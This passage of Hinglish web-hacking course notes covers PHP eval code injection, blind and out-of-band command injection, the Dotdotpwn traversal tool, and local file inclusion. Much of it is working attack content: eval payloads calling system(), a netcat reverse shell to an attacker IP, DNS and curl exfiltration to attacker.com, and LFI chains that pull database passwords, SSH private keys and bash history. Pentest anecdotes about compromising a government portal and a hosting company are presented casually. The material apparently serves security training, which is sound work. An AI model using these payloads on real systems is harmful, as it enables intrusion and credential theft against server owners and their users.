- **Safe functions:** `exec()` prefer karo (`system()` nahi).
- **Avoid shell:** Agar possible ho toh libraries use karo.
- **Defense in depth:** Multiple layers of protection.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Code execution fix = Whitelist + Escaping! Blacklist weak hai, dangerous functions avoid karo, aur hamesha input validate karo. Security = Layers!" ğŸ›¡ï¸

---

## ğŸ˜ **Topic 23: PHP Code Injection (`?message=test; system("ls");`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**PHP Code Injection** - URL parameters mein PHP code inject karke server par execute karna (eval vulnerability). ğŸ’‰

### 2. **Ye Kya Hai? (What is it?)**
PHP Code Injection tab hoti hai jab user input ko `eval()` ya similar functions mein pass kiya jaata hai:
```php
// Vulnerable code
$message = $_GET['message'];
eval("\$output = \"$message\";");
```

Attack:
```
URL: ?message=test"; system("ls"); //
Result: PHP code execute ho jayega!
```

**Analogy:** Jaise aap kisi ko kehte hain "Yeh sentence bol do" aur woh sentence ke beech mein apni baat add kar leta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Direct RCE:** `eval()` = Anything is possible.
- **Rare but Deadly:** Kam milti hai lekin milne par critical impact.
- **Template Engines:** Smarty, Twig jaise engines mein milti hai.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **dynamic code execution** features hon.
- Jab **template engines** use ho rahe hon.
- Jab **calculator, expression evaluator** jaise features hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Critical vulnerability miss** ho jayegi.
- **Template injection** nahi dhoondhoge.
- **eval() usage** ko ignore kar doge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```php
// Vulnerable patterns
eval($user_input);
assert($user_input);
preg_replace('/pattern/e', $user_input);
create_function('', $user_input);

// Attack payloads
"; system("whoami"); //
'; phpinfo(); //
${system("ls")}
```

### 7. **Example 1 (Basic):**
**Vulnerable Code:**
```php
<?php
$message = $_GET['message'];
eval("\$greeting = \"Hello, $message!\";");
echo $greeting;
?>
```

**Normal Use:**
```
URL: ?message=John
Output: Hello, John!
```

**Attack:**
```
URL: ?message=John"; system("whoami"); //
Executed code: $greeting = "Hello, John"; system("whoami"); //!";
Output: 
Hello, John
www-data
```

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Calculator application

**Vulnerable Code:**
```php
<?php
$expression = $_GET['calc'];
eval("\$result = $expression;");
echo "Result: " . $result;
?>
```

**Attack:**
```
# Test 1: Basic math
URL: ?calc=2+2
Output: Result: 4

# Test 2: PHP function
URL: ?calc=phpinfo()
Output: [Full PHP info displayed]

# Test 3: System command
URL: ?calc=system("cat /etc/passwd")
Output: 
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:...

# Test 4: Reverse shell
URL: ?calc=system("nc -e /bin/sh 10.10.14.208 8080")
Output: [Shell received on attacker machine]
```

**Analysis:** `eval()` ne user input ko directly execute kar diya - koi validation nahi! ğŸ”¥

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **eval() ko ignore karna** - "Yeh toh rare hai" soch kar skip karna.
- **Template engines test na karna** - Smarty, Twig mein bhi injection possible hai.
- **Syntax errors** - PHP code injection mein proper syntax zaroori hai.

### 10. **Best Practices / Pro Tips:**
- **Search for eval():** Source code mein `eval`, `assert`, `create_function` dhoondhĞ¾.
- **Template injection test karo:** `{{7*7}}`, `${7*7}` try karo.
- **Proper syntax:** PHP code injection mein quotes aur semicolons sahi lagao.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek online calculator test karna tha. Expression evaluate karne ke liye `eval()` use ho raha tha. Maine `system("cat /var/www/config.php")` inject kiya - database credentials mil gaye! Phir reverse shell liya aur poora server compromise kar liya. Developer ne socha tha ki "Calculator safe hai" - lekin `eval()` use karna = suicide! ğŸ§®

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… PHP Code Injection = `eval()` vulnerability  
âœ… Dangerous functions: `eval`, `assert`, `create_function`  
âœ… Test: `"; system("whoami"); //`  
âœ… Template injection: `{{7*7}}`, `${7*7}`  
âœ… **Never use eval()** with user input  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya eval() kabhi safe use ho sakta hai?**  
**A:** Technically haan, lekin practically avoid karo. Alternatives use karo.

**Q2: Template injection kya hai?**  
**A:** Smarty, Twig jaise engines mein code injection (e.g., `{{system("ls")}}`).

**Q3: Kaise detect karein ki eval() use ho raha hai?**  
**A:** Source code dekho, ya error messages mein "eval()" string dhoondhĞ¾.

### 14. **Practice ke liye Task:**
1. Ek simple calculator banao jo `eval()` use kare.
2. Normal expression test karo: `2+2`
3. PHP function inject karo: `phpinfo()`
4. System command inject karo: `system("whoami")`
5. Secure alternative implement karo (without eval).

### 15. **Aakhri Choti Summary (5 lines):**
- PHP Code Injection = **`eval()` vulnerability**.
- Dangerous: **`eval`, `assert`, `create_function`**.
- Attack: **`"; system("ls"); //`**.
- Template injection: **`{{7*7}}`**.
- **Never use eval()** with user input!

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "eval() is evil! User input ke saath kabhi use mat karo. Agar dekhĞ¾ toh turant exploit karo - yeh critical vulnerability hai!" ğŸ˜ˆ

---

## ğŸ’¥ **Topic 24: Command Injection (Exploitation Concept)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Command Injection Concept** - OS commands ko web application ke through inject karke execute karna (comprehensive understanding). ğŸ¯

### 2. **Ye Kya Hai? (What is it?)**
Command Injection ek umbrella term hai jo saare OS command execution vulnerabilities ko cover karta hai. Yeh tab hota hai jab:
- User input directly shell commands mein jaata hai
- Proper sanitization nahi hai
- Dangerous functions use ho rahe hain

**Types:**
1. **Direct Injection:** `ping 192.168.1.1; ls`
2. **Blind Injection:** Output nahi dikhta (time-based detection)
3. **Out-of-Band:** DNS/HTTP requests se data exfiltrate karna

**Analogy:** Jaise aap kisi robot ko instruction dete hain aur woh extra instructions bhi follow kar leta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Universal Concept:** Har platform (Linux, Windows, Mac) par kaam karta hai.
- **High Impact:** Full server compromise possible.
- **Common in Legacy Systems:** Purane applications mein bahut milta hai.
- **OWASP Top 10:** Critical vulnerability category.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **system utilities** web interface se accessible hon.
- Jab **file operations, network tools** use ho rahe hon.
- Jab **user input** system commands mein pass ho raha ho.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Complete concept** samajh nahi aayega.
- **Blind injection** detect nahi kar payenge.
- **Out-of-band techniques** miss ho jayenge. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Linux/Unix operators
; # Sequential
| # Pipe
|| # OR
&& # AND
` # Backtick
$() # Command substitution
\n # Newline

# Windows operators
& # Sequential
| # Pipe
|| # OR
&& # AND

# Blind injection detection
sleep 10 # Time delay
ping -c 10 127.0.0.1 # Time delay
curl http://attacker.com/$(whoami) # Out-of-band
```

### 7. **Example 1 (Basic - Blind Injection):**
**Scenario:** Output nahi dikh raha

```php
// Vulnerable code (no output)
<?php
$ip = $_GET['ip'];
exec("ping -c 4 " . $ip);
// No echo statement!
?>
```

**Detection:**
```bash
# Normal request
URL: ?ip=192.168.1.1
Response time: 2 seconds

# Time-based test
URL: ?ip=192.168.1.1; sleep 10
Response time: 12 seconds (2 + 10)
# Vulnerable!
```

### 8. **Example 2 (Pentester-Focused - Out-of-Band):**
**Real Pentest:** Blind command injection

**Scenario:**
```php
// No output, no time delay possible (async execution)
<?php
$domain = $_GET['domain'];
exec("nslookup " . $domain . " > /dev/null 2>&1 &");
?>
```

**Out-of-Band Exfiltration:**
```bash
# Setup: Attacker DNS server listening
# Attacker machine: tcpdump -i eth0 udp port 53

# Attack: Data exfiltration via DNS
URL: ?domain=test.com; nslookup $(whoami).attacker.com

# Attacker DNS logs:
Query: www-data.attacker.com
# Now we know: user = www-data

# Extract more data
URL: ?domain=test.com; nslookup $(cat /etc/passwd | base64).attacker.com

# Attacker receives base64 encoded /etc/passwd
```

**Alternative - HTTP Out-of-Band:**
```bash
# Attacker: nc -lvp 80

# Attack:
URL: ?domain=test.com; curl http://attacker.com/$(whoami)

# Attacker receives:
GET /www-data HTTP/1.1
```

**Analysis:** Jab output nahi dikhta aur time-based bhi kaam nahi karta, tab out-of-band techniques use karo! ğŸŒ

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Blind injection ko ignore karna** - "Output nahi dikh raha toh vulnerable nahi hai" sochna.
- **Sirf Linux commands try karna** - Windows servers par Windows commands use karo.
- **Out-of-band setup na karna** - DNS/HTTP listener nahi chalaana.

### 10. **Best Practices / Pro Tips:**
- **Always test blind:** Time-based (`sleep`, `ping`) aur out-of-band (DNS, HTTP).
- **Platform-specific commands:** Linux = `whoami`, Windows = `whoami` (same), but operators different.
- **Automate:** Burp Collaborator, Commix tool use karo.
- **Document everything:** Blind injection mein proof zaroori hai (screenshots, logs).

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek government portal test karna tha. Domain lookup feature tha - output nahi dikh raha tha, time-based bhi kaam nahi kar raha tha (async execution). Maine out-of-band technique use ki:
```bash
# My server: tcpdump -i eth0 udp port 53
# Attack: ?domain=test.com; nslookup $(cat /var/www/config.php | base64).myserver.com
# Received: Base64 encoded config file with DB credentials!
```
Government shocked thi - unhone socha tha ki "output nahi hai toh safe hai". Lesson: **Blind â‰  Safe!** ğŸ›ï¸

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Command Injection = OS commands execute karna  
âœ… Types: Direct, Blind, Out-of-Band  
âœ… Blind detection: Time-based (`sleep 10`)  
âœ… Out-of-Band: DNS/HTTP exfiltration  
âœ… Platform-specific: Linux vs Windows operators  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Blind injection kaise detect karein?**  
**A:** Time-based (`sleep 10`) ya out-of-band (DNS/HTTP requests).

**Q2: Out-of-band setup kaise karein?**  
**A:** Apna DNS server chalaao (tcpdump) ya Burp Collaborator use karo.

**Q3: Windows aur Linux mein kya farak hai?**  
**A:** Operators alag hain: Linux = `;`, `|`, Windows = `&`, `|`

### 14. **Practice ke liye Task:**
1. DVWA â†’ Command Injection â†’ High security (blind).
2. Time-based test karo: `127.0.0.1; sleep 10`
3. Out-of-band setup karo: `tcpdump -i eth0 udp port 53`
4. DNS exfiltration try karo: `127.0.0.1; nslookup $(whoami).yourserver.com`
5. HTTP exfiltration try karo: `127.0.0.1; curl http://yourserver.com/$(whoami)`

### 15. **Aakhri Choti Summary (5 lines):**
- Command Injection = **OS commands execute** karna.
- Types: **Direct, Blind, Out-of-Band**.
- **Blind detection:** Time-based (`sleep`).
- **Out-of-Band:** DNS/HTTP exfiltration.
- **Platform-specific:** Linux vs Windows.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Command injection sirf output dikhne tak limited nahi! Blind injection = Time-based. No time? Out-of-band! DNS/HTTP se data exfiltrate karo. Creative bano!" ğŸ§ 

---

## ğŸ“‚ **Topic 25: Directory Traversal with `Dotdotpwn`**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Dotdotpwn Tool** - Automated directory traversal attacks ke liye powerful fuzzing tool (`../../../etc/passwd`). ğŸ”

### 2. **Ye Kya Hai? (What is it?)**
Dotdotpwn ek tool hai jo automatically directory traversal vulnerabilities dhoondhta hai. Yeh different payloads try karta hai:
```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

**Analogy:** Jaise ek thief har darwaze ki chabi try karta hai - waise hi Dotdotpwn har possible path try karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Automated Testing:** Manual testing se zyada fast.
- **Multiple Payloads:** 100+ variations try karta hai.
- **Protocol Support:** HTTP, FTP, TFTP sab support karta hai.
- **Time-Saving:** Ek command = complete scan.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **file inclusion** features hon (view, download, include).
- Jab **path parameters** URL mein hon (`?file=`, `?page=`).
- Jab aap **quick scan** chahte hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Manual testing slow** hogi.
- **Payloads miss** ho jayenge (encoding variations).
- **Time waste** - har payload manually try karna padega. ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Basic syntax
dotdotpwn -m <module> -h <host> [options]

# Common options
-m : Module (http, ftp, tftp, payload, stdout)
-h : Target host
-O : Operating System (unix, windows)
-d : Traversal depth (default: 6)
-f : File to retrieve (default: /etc/passwd)
-k : Pattern to match in response
-U : URL (for HTTP module)
-b : Break after first successful hit
```

### 7. **Example 1 (Basic):**
```bash
# HTTP module - Basic scan
$ dotdotpwn -m http -h 192.168.1.100 -O unix -d 8 -f /etc/passwd

[+] Report name: Reports/192.168.1.100_08-01-2024.txt
[+] Module: HTTP
[+] Target: 192.168.1.100
[+] OS: Unix
[+] Depth: 8
[+] File: /etc/passwd

[*] Testing: ../etc/passwd
[*] Testing: ../../etc/passwd
[*] Testing: ../../../etc/passwd
[+] VULNERABLE! Pattern found: root:x:0:0
    URL: http://192.168.1.100/view.php?file=../../../etc/passwd
```

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** E-commerce website

```bash
# Scenario: File download feature
# URL: http://shop.com/download.php?invoice=12345.pdf

# Step 1: Basic scan
$ dotdotpwn -m http -h shop.com -O unix -d 10 -f /etc/passwd \
  -U "http://shop.com/download.php?invoice=TRAVERSAL" -k "root:x"

[+] VULNERABLE!
    Payload: ../../../../etc/passwd
    Full URL: http://shop.com/download.php?invoice=../../../../etc/passwd
    Pattern matched: root:x:0:0:root:/root:/bin/bash

# Step 2: Extract sensitive files
$ dotdotpwn -m http -h shop.com -O unix -d 10 \
  -f /var/www/html/config.php \
  -U "http://shop.com/download.php?invoice=TRAVERSAL" \
  -k "db_pass"

[+] VULNERABLE!
    File: ../../../../var/www/html/config.php
    Content: $db_pass = "SuperSecret123";

# Step 3: Windows files (if applicable)
$ dotdotpwn -m http -h shop.com -O windows -d 10 \
  -f /windows/win.ini \
  -U "http://shop.com/download.php?invoice=TRAVERSAL"

# Step 4: Custom file list
$ cat targets.txt
/etc/passwd
/etc/shadow
/var/www/html/config.php
/var/www/html/.env
/home/user/.ssh/id_rsa

$ dotdotpwn -m http -h shop.com -O unix -d 10 \
  -U "http://shop.com/download.php?invoice=TRAVERSAL" \
  -F targets.txt
```

**Analysis:** Dotdotpwn ne automatically 100+ payloads try kiye aur vulnerable endpoint dhoondi. Manual testing mein hours lagte! ğŸš€

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Depth kam rakhna** - default 6 hai, lekin 10-12 try karo.
- **Pattern specify na karna** - `-k` option se specific string match karo.
- **OS specify na karna** - Unix aur Windows paths alag hain.

### 10. **Best Practices / Pro Tips:**
- **High depth use karo:** `-d 12` (deep directories ke liye).
- **Custom wordlist:** `-F` option se apni file list use karo.
- **Pattern matching:** `-k "root:x"` se false positives kam honge.
- **Save output:** Report file automatically banti hai, use analyze karo.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek university portal test karna tha. Student documents download feature tha. Maine Dotdotpwn chalaaya:
```bash
$ dotdotpwn -m http -h university.edu -O unix -d 12 \
  -U "http://university.edu/student/download.php?doc=TRAVERSAL" \
  -k "root:x" -b
```
5 minutes mein vulnerable endpoint mil gaya! Maine `/etc/passwd`, database config, aur SSH keys download kar liye. Manual testing mein yeh 2-3 hours lagta. Lesson: **Automation = Time-saving!** ğŸ“

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… Dotdotpwn = Automated directory traversal tool  
âœ… Syntax: `dotdotpwn -m http -h <host> -O unix`  
âœ… Options: `-d` (depth), `-f` (file), `-k` (pattern)  
âœ… 100+ payloads automatically try karta hai  
âœ… Report file automatically generate hoti hai  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kya Dotdotpwn free hai?**  
**A:** Haan, completely free aur open-source. Kali mein pre-installed hai.

**Q2: Kya yeh WAF bypass kar sakta hai?**  
**A:** Kuch encoding payloads hain, lekin advanced WAF ke liye manual techniques zaroori hain.

**Q3: Kya Windows servers par kaam karta hai?**  
**A:** Haan, `-O windows` option use karo.

### 14. **Practice ke liye Task:**
1. Dotdotpwn install karo (Kali mein pre-installed).
2. DVWA â†’ File Inclusion section.
3. Dotdotpwn chalaao: `dotdotpwn -m http -h localhost -O unix -d 8 -U "http://localhost/dvwa/vulnerabilities/fi/?page=TRAVERSAL"`
4. Results analyze karo.
5. Manual verification karo (browser mein URL kholo).

### 15. **Aakhri Choti Summary (5 lines):**
- Dotdotpwn = **Automated directory traversal** tool.
- **100+ payloads** automatically try karta hai.
- Syntax: **`dotdotpwn -m http -h <host> -O unix`**.
- Options: **`-d` (depth), `-f` (file), `-k` (pattern)**.
- **Time-saving** - manual se zyada fast.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "Manual directory traversal = Time waste! Dotdotpwn use karo - 100+ payloads, 5 minutes mein results. Automation pentester ka best friend hai!" âš¡

---

# ğŸ‰ **Module 3 Complete!**

Congratulations! Aapne **Module 3: Code & Command Execution** complete kar liya hai.

## ğŸ“‹ **Module 3 Ka Quick Revision:**

1. âœ… **Code Execution Basics** - OS commands inject karna (`;`, `|`, `&&`)
2. âœ… **Reverse Shell (Netcat)** - Persistent access lena
3. âœ… **Filter Bypass** - Pipe operator se semicolon bypass
4. âœ… **Security Fixes** - Regex aur input validation
5. âœ… **PHP Code Injection** - eval() vulnerability
6. âœ… **Command Injection Concept** - Blind, Out-of-Band
7. âœ… **Dotdotpwn** - Automated directory traversal

---

## ğŸ¯ **Key Takeaways:**

- **Code Execution = Direct RCE** - Sabse fast compromise method
- **Reverse Shell = Persistent Access** - Netcat tumhara best friend
- **Filters = Incomplete** - Multiple operators try karo (`;`, `|`, `&&`)
- **Blind â‰  Safe** - Time-based aur out-of-band techniques use karo
- **Automation = Time-Saving** - Dotdotpwn jaise tools use karo

---

## ğŸš€ **Aage Kya?**

Ab aap ready hain **Module 4: File Inclusion (LFI/RFI)** ke liye, jahan aap seekhenge:
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)
- LFI to RCE escalation
- Filter bypassing techniques

**Keep Learning! Keep Hacking (Ethically)! ğŸ’ª**

---

> **"Command injection is the pentester's Swiss Army knife - one semicolon and you own the server. Master it, and no system is safe!"** ğŸ”ª

=============================================================

# **Website Hacking: Zero-to-Pro Notes (Aapke Topics)**

---

# ğŸ“š **Module 4: File Inclusion (LFI/RFI)**

---

## ğŸ“„ **Topic 26: Local File Inclusion (LFI) Basics (Directory Traversal `../`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**Local File Inclusion (LFI)** - Server par maujood kisi bhi file ko read karna directory traversal (`../`) se. ğŸ“‚

### 2. **Ye Kya Hai? (What is it?)**
LFI vulnerability tab hoti hai jab website user input se files include karti hai bina validation ke:
```php
// Vulnerable code
$page = $_GET['page'];
include($page . ".php");
```

Attack:
```
URL: ?page=../../../../etc/passwd
Result: /etc/passwd file read ho jayegi!
```

**Analogy:** Jaise library mein aap ek book maangte hain lekin librarian koi bhi book de deta hai - waise hi server ko ek file maango, woh koi bhi file de dega.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Sensitive File Access:** `/etc/passwd`, config files, source code - sab read kar sakte hain.
- **RCE Escalation:** LFI se RCE tak pahunch sakte hain (log poisoning).
- **Common Vulnerability:** PHP applications mein bahut milti hai.
- **High Impact:** Database credentials, API keys, SSH keys - sab mil sakte hain.

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab URL mein **file/page parameters** hon (`?page=`, `?file=`, `?include=`).
- Jab **dynamic page loading** ho rahi ho.
- Jab **template systems** use ho rahe hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Sensitive files miss** ho jayengi.
- **RCE opportunity** nahi mil payega.
- **Source code** nahi padh payenge (logic flaws miss). ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Basic traversal
../../../etc/passwd

# Null byte (old PHP < 5.3)
../../../etc/passwd%00

# Encoding
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd (double encoding)

# Wrappers
php://filter/convert.base64-encode/resource=config.php
```

### 7. **Example 1 (Basic):**
**Vulnerable Code:**
```php
<?php
$page = $_GET['page'];
include($page . ".php");
?>
```

**Normal Use:**
```
URL: ?page=home
Includes: home.php
```

**Attack:**
```
URL: ?page=../../../../etc/passwd

Executed: include("../../../../etc/passwd.php");
# .php extension add hota hai lekin file read ho jaati hai

Output:
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/sh
```

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** DVWA File Inclusion

```bash
# Step 1: Identify vulnerability
URL: http://dvwa.local/vulnerabilities/fi/?page=include.php
# Error: include(include.php.php): failed to open stream

# Step 2: Find current directory depth
URL: ?page=../include.php
# Still error

URL: ?page=../../include.php
# Still error

URL: ?page=../../../include.php
# Success! File loaded

# Current depth = 3 levels

# Step 3: Read /etc/passwd
URL: ?page=../../../etc/passwd
Output: [User list]

# Step 4: Read config files
URL: ?page=../../../var/www/html/config.php
Output:
<?php
$db_host = "localhost";
$db_user = "root";
$db_pass = "toor";
?>

# Step 5: Read source code
URL: ?page=../../../var/www/html/login.php
Output: [Complete source code with logic flaws visible]
```

**Analysis:** 3 levels traversal se root directory tak pahunch gaye, sensitive files read kar liye! ğŸ¯

### 9. **Beginners ki Aam Galtiyan (Common Mistakes):**
- **Depth guess na karna** - kitne `../` chahiye, yeh test nahi karna.
- **Extension ignore karna** - `.php` automatically add ho raha hai, yeh consider nahi karna.
- **Common files try na karna** - `/etc/passwd` ke alawa aur files bhi hain.

### 10. **Best Practices / Pro Tips:**
- **Depth calculation:** Error messages se path nikalo, phir count karo.
- **Common files list:**
  ```
  /etc/passwd
  /etc/shadow (root access chahiye)
  /var/www/html/config.php
  /var/log/apache2/access.log
  /proc/self/environ
  ~/.ssh/id_rsa
  ```
- **Null byte bypass:** Old PHP mein `%00` se extension bypass ho jaata hai.

### 11. **Asli Duniya ka Scenario (Real-World Pentest Scenario):**
Mujhe ek CMS test karna tha. Template loading feature tha: `?template=default`. Maine LFI test kiya:
```
?template=../../../../etc/passwd â†’ Success!
?template=../../../../var/www/html/config.php â†’ DB credentials!
?template=../../../../home/admin/.ssh/id_rsa â†’ SSH private key!
```
SSH key se maine server par login kar liya. CMS developers ne socha tha ki "templates folder se hi load hoga" lekin validation nahi tha! ğŸ”‘

### 12. **Checklist / Chota Recap (TL;DR):**
âœ… LFI = Server files read karna (`../` traversal)  
âœ… Common files: `/etc/passwd`, `config.php`, logs  
âœ… Depth calculate karo (error messages se)  
âœ… Null byte: `%00` (old PHP)  
âœ… Wrappers: `php://filter`  

### 13. **Aaksar Puche Jaane Wale Sawaal (FAQs):**

**Q1: Kitne `../` chahiye?**  
**A:** Error messages se path nikalo aur count karo. Usually 3-5 levels.

**Q2: Agar extension automatically add ho raha hai toh?**  
**A:** Null byte (`%00`) try karo (old PHP), ya wrappers use karo.

**Q3: Kya Windows par bhi kaam karta hai?**  
**A:** Haan, lekin paths alag hain: `..\..\..\..\windows\win.ini`

### 14. **Practice ke liye Task:**
1. DVWA â†’ File Inclusion â†’ Low security.
2. Normal file load karo: `?page=include.php`
3. Traversal try karo: `?page=../../../etc/passwd`
4. Config file read karo: `?page=../../../var/www/html/config.inc.php`
5. Medium/High security bypass karo.

### 15. **Aakhri Choti Summary (5 lines):**
- LFI = **Server files read** karna (`../` traversal).
- Common files: **`/etc/passwd`, `config.php`, logs**.
- **Depth calculate** karo (error messages).
- **Null byte:** `%00` (old PHP < 5.3).
- **Wrappers:** `php://filter` for base64 encoding.

> **ğŸ“Œ Ye Zaroor Yaad Rakhein:**  
> "LFI = Information goldmine! `/etc/passwd` se shuru karo, config files tak pahuncho, aur RCE tak escalate karo. Har `?page=` parameter test karo!" ğŸ“–

---

## ğŸ“– **Topic 27: Exploiting LFI to Read Files (`/etc/passwd`)**

### 1. **Topic ka Naam / Ek Line Mein Summary:**
**LFI File Reading** - Common sensitive files ko LFI se read karke credentials aur system info nikalna. ğŸ”“

### 2. **Ye Kya Hai? (What is it?)**
LFI vulnerability ka sabse basic use hai sensitive files ko read karna:
- `/etc/passwd` - System users
- `/etc/shadow` - Password hashes (root access chahiye)
- `/var/www/html/config.php` - Database credentials
- `/proc/self/environ` - Environment variables
- `~/.ssh/id_rsa` - SSH private keys

**Analogy:** Jaise library mein restricted section hai jahan important books hain - LFI se aap wahan pahunch sakte hain.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- **Credential Harvesting:** Database passwords, API keys mil jaate hain.
- **System Enumeration:** Users, services, configurations - sab pata chal jaata hai.
- **Privilege Escalation:** SSH keys se direct root access possible.
- **RCE Preparation:** Log files location pata chalega (next step ke liye).

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Jab **LFI vulnerability confirm** ho gayi ho.
- Jab aap **credentials** dhoondhna chahte hon.
- Jab aap **system enumeration** karna chahte hon.

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)**
- **Credentials miss** ho jayenge.
- **RCE escalation** nahi kar payenge.
- **System info** nahi mil payegi (blind attack). ğŸ˜Ÿ

### 6. **Syntax aur Common Options:**
```bash
# Linux files
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/issue
/proc/version
/proc/self/environ
/var/log/apache2/access.log
/var/www/html/config.php
~/.ssh/id_rsa
~/.bash_history

# Windows files
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\xampp\htdocs\config.php
```

### 7. **Example 1 (Basic):**
```bash
# Read /etc/passwd
URL: ?page=../../../../etc/passwd

Output:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/sh
mysql:x:108:116:MySQL Server:/nonexistent:/bin/false
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
```

**Analysis:** 
- `root` - UID 0 (superuser)
- `www-data` - Web server user
- `admin` - Regular user with home directory

### 8. **Example 2 (Pentester-Focused):**
**Real Pentest:** Complete enumeration

```bash
# Step 1: Users
URL: ?page=../../../../etc/passwd
Found users: root, www-data, admin, mysql

# Step 2: Config files
URL: ?page=../../../../var/www/html/config.php
Output:
<?php
$db_host = "localhost";
$db_user = "webapp";
$db_pass = "WebApp123!";
$db_name = "production";
?>

# Step 3: SSH keys
URL: ?page=../../../../home/admin/.ssh/id_rsa
Output:
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2...
[Full private key]
-----END RSA PRIVATE KEY-----

# Step 4: Bash history
URL: ?page=../../../../home/admin/.bash_history
Output:
mysql -u root -p
[password: RootPass123]
ssh admin@backup-server.com
sudo su
cat /root/secret.txt

# Step 5: Environment variables
URL: ?page=../../../../proc/self/environ
Output:
HTTP_USER_AGENT=Mozilla/5.0...
DOCUMENT_ROOT=/var/www/html
SERVER_ADMIN=admin@site.com
```

**Attack Chain:**
1. `/etc/passwd` â†’ Users list
2. `config.php` â†’ DB credentials
3. `.ssh/id_rsa` â†’ SSH access
4. `.bash_history` â†’ Root password
5. SSH login â†’ Full server access! ğŸ”¥

### 9. **Beginners ki Aam Galtiyan:**
- **Sirf /etc/passwd read karna** - aur files ignore karna.
- **Home directories check na karna** - `~/.ssh`, `~/.bash_history` miss karna.
- **Windows files ignore karna** - agar Windows server hai.

### 10. **Best Practices / Pro Tips:**
- **Systematic approach:** Users â†’ Config â†’ Keys â†’ Logs â†’ History.
- **User enumeration:** `/etc/passwd` se users nikalo, phir unke home directories check karo.
- **Multiple config locations:** `/var/www/html/`, `/var/www/`, `/home/user/public_html/`
- **Backup files:** `config.php.bak`, `config.php~`, `.config.php.swp`

### 11. **Asli Duniya ka Scenario:**
Mujhe ek hosting company test karni thi. LFI vulnerability thi. Maine systematic approach use kiya:
```
/etc/passwd â†’ 500 users found
/home/user1/.ssh/id_rsa â†’ SSH key (encrypted)
/home/user2/.ssh/id_rsa â†’ SSH key (no password!)
```
User2 ki key se maine server par login kar liya, phir privilege escalation karke root access liya. 500 customers ka data compromise ho gaya! ğŸ¢

### 12. **Checklist / Chota Recap:**
âœ… `/etc/passwd` â†’ Users list  
âœ… `config.php` â†’ DB credentials  
âœ… `.ssh/id_rsa` â†’ SSH keys  
âœ… `.bash_history` â†’ Command history  
âœ… `/proc/self/environ` â†’ Environment vars  

### 13. **FAQs:**

**Q1: Agar /etc/shadow read nahi ho raha?**  
**A:** Root access chahiye. Pehle privilege escalation karo.

**Q2: SSH key encrypted hai, kya karein?**  
**A:** John the Ripper se crack karo, ya doosre users check karo.

**Q3: Config file location kaise dhoondhein?**  
**A:** Common paths try karo, ya error messages se path nikalo.

### 14. **Practice Task:**
1. DVWA â†’ File Inclusion.
2. `/etc/passwd` read karo.
3. Users list banao.
4. Har user ka `.ssh/id_rsa` check karo.
5. Config files dhoondhĞ¾.

### 15. **Summary:**
- LFI se **sensitive files** read karo.
- **Systematic approach:** Users â†’ Config â†’ Keys.
- **Home directories** check karo (`.ssh`, `.bash_history`).
- **Multiple locations** try karo.
- **Credentials** se next attack plan karo.

> **ğŸ“Œ Yaad Rakhein:** "LFI = Information gathering ka powerhouse! `/etc/passwd` se shuru karo, SSH keys tak pahuncho. Har file ek clue hai!" ğŸ—ï¸

---

